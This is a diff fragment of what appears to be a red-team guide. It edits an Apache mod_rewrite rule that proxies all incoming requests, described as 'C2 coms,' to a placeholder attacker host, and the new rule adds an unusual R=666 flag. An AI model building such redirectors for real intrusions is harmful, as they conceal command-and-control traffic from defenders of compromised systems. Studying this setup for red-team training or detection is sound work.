@@ -116,7 +116,7 @@ Lets add our proxy rule to allow our C2 coms through our new proxy.
 	AllowOverride All
    	RewriteEngine On
 
-	RewriteRule ^.*$ http://<ParrotIpHere>%{REQUEST_URI} [P]
+	RewriteRule ^(.*)$ http://<ParrotIpHere>$1 [P,R=666]
 
     ErrorLog ${APACHE_LOG_DIR}/error.log
     CustomLog ${APACHE_LOG_DIR}/access.log combined
